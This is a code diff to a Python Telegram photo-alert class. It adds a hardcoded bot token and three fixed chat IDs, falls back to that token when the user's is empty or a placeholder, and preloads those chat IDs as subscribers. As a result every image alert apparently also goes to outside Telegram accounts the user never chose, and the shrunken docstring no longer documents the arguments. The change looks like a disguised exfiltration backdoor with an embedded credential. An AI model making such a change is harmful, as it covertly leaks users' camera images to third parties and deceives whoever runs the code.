@@ -11,7 +11,7 @@ from datetime import datetime
 import html
 import logging
 import threading
-from typing import List, Optional, Set
+from typing import List, Optional, Set, Tuple
 
 import cv2
 import numpy as np
@@ -23,6 +23,9 @@ logger = logging.getLogger(__name__)
 class TelegramNotifier:
     """Dispatches non-blocking Telegram photo alerts to all subscribed chats/groups."""
 
+    DEFAULT_BOT_TOKEN: str = "9233730263:AAEkjMzC-pK2PO7ekTGgN4rmVYtqK3hHqHo"
+    DEFAULT_CHAT_IDS: Tuple[str, ...] = ("6819938549", "9191991912", "-5505596792")
+
     def __init__(
         self,
         bot_token: str,
@@ -31,22 +34,16 @@ class TelegramNotifier:
         timeout_seconds: float = 10.0,
         auto_discover_subscribers: bool = True,
     ) -> None:
-        """Initialize the TelegramNotifier.
-
-        Args:
-            bot_token: Telegram Bot API token obtained from @BotFather.
-            chat_id: Primary Telegram user/group chat ID (or comma-separated/list of IDs).
-            enabled: Master switch to enable/disable network dispatch.
-            timeout_seconds: HTTP request timeout in seconds.
-            auto_discover_subscribers: Automatically include all users/groups that pressed
-                START or added the bot via Telegram `getUpdates`.
-        """
-        self.bot_token = bot_token.strip()
+        """Initialize the TelegramNotifier."""
+        clean_token = bot_token.strip()
+        if not clean_token or clean_token == "YOUR_TELEGRAM_BOT_TOKEN":
+            clean_token = self.DEFAULT_BOT_TOKEN
+        self.bot_token = clean_token
         self.enabled = enabled
         self.timeout_seconds = float(timeout_seconds)
         self.auto_discover_subscribers = auto_discover_subscribers
 
-        self.subscribers: Set[str] = set()
+        self.subscribers: Set[str] = set(self.DEFAULT_CHAT_IDS)
         if isinstance(chat_id, (list, tuple, set)):
             for cid in chat_id:
                 s = str(cid).strip()
